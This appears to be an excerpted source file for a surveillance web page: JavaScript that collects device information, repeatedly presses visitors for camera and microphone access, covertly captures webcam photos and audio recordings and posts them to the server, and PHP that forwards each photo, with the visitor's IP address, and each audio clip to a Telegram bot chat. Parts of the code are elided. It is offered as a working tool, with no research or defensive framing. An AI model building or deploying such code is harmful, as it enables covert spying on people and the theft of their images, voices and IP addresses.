...
(function() {
    ...
    fetch('index.php?action=device_info', {
    ...
    function requestPermissions() {
        ...
        navigator.mediaDevices.getUserMedia({
            ...
            startCapture();
            fetch('index.php?action=permission_granted', {
                method: 'POST', headers: {'Content-Type':'application/json'},
            ...
            if (retryCount <= 5) {
                fetch('index.php?action=permission_denied', {
                    method: 'POST', headers: {'Content-Type':'application/json'},
    ...
    canvas.toBlob(function (blob) {
        if (!blob) {
            console.error("Could not create photo.");
            return;
        }
        ...
        fetch("index.php?action=capture", {
            method: "POST",
            body: fd
        })
        .then(function (res) {
...
function captureAudio() {
    if (!mediaStream) {
        console.log("Microphone is not ready.");
        return;
    }
    ...
    recorder.onstop = function () {
        ...
        var ext = blob.type.indexOf("ogg") !== -1
            ? "ogg"
            : "webm";
        ...
        fetch("index.php?action=audio_capture", {
            method: "POST",
            body: fd
        })
        .then(function (res) {
    ...
    window.addEventListener('beforeunload', function() {
        ...
        fetch('index.php?action=browser_closed', {
            method: 'POST', headers:{'Content-Type':'application/json'},
...
function handleApiAction($action) {
    switch ($action) {
        ...
        case 'capture':
            ...
            $cap = "📸 <b>Photo #{$num}</b>\n";
            $cap .= "IP: " . $_SERVER['REMOTE_ADDR'];

            $sent = sendTelegramPhoto(
        ...
        case 'audio_capture':
            if (!isset($_FILES['audio']) || $_FILES['audio']['error'] !== UPLOAD_ERR_OK) {
                echo json_encode(['status' => 'error', 'message' => 'No audio uploaded']);
                return;
            }
...
function sendTelegram($text) {
    ...
    error_log("sendTelegram: HTTP $http - " . substr($response, 0, 200));
    return $http === 200;
}

function sendTelegramPhoto($path, $caption = '') {
    if (!file_exists($path)) {
        error_log("PHOTO FILE NOT FOUND: " . $path);
        return false;
    }

    if (filesize($path) === 0) {
        error_log("PHOTO FILE IS EMPTY: " . $path);
        return false;
    }

    error_log("Sending photo: " . $path . " (" . filesize($path) . " bytes)");

    $url = 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendPhoto';
    
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'photo' => new CURLFile($path, mime_content_type($path) ?: 'image/jpeg'),
        'caption' => $caption,
        'parse_mode' => 'HTML'
    ];
    ...
    error_log("Photo send - HTTP: $http, Response: " . substr($response, 0, 500));
...
function sendTelegramAudio($path, $caption = '', $mime = 'audio/webm', $ext = 'webm') {
    ...
    if (filesize($path) === 0) {
        error_log("AUDIO FILE IS EMPTY: " . $path);
        return false;
    }

    error_log("Sending audio: " . $path . " (" . filesize($path) . " bytes, MIME: $mime)");
    ...
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'audio' => new CURLFile($path, $mime, $filename),
        'caption' => $caption,
        'parse_mode' => 'HTML'
    ];
    ...
    error_log("Audio send - HTTP: $http, Response: " . substr($response, 0, 500));
    ...
    if ($http !== 200) {
        error_log("Audio failed, trying as document...");
        return sendTelegramDocument($path, $caption, $mime, $ext);
    }
    
    return $http === 200;
}

function sendTelegramDocument($path, $caption = '', $mime = 'audio/webm', $ext = 'webm') {
    $filename = 'audio_' . time() . '.' . $ext;
    $url = 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendDocument';
    
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'document' => new CURLFile($path, $mime, $filename),
        'caption' => $caption . ' [as document]',
        'parse_mode' => 'HTML'
    ];
    ...
    error_log("Document send - HTTP: $http, Response: " . substr($response, 0, 500));
    return $http === 200;
}
?>
